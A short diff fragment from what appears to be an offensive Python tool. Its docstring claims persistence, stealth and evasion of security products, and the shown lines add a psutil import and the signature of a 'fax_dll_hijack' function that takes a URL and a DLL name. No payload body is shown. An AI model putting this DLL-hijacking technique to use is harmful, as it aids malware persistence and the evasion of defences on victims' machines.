@@ -10,6 +10,7 @@ on itself to avoid being unloaded. This achieves persistence, stealth and in som
 cases PSP avoidance.
 """
 import os
+import psutil
 import requests
 
 def fax_dll_hijack(url,rename_dll):
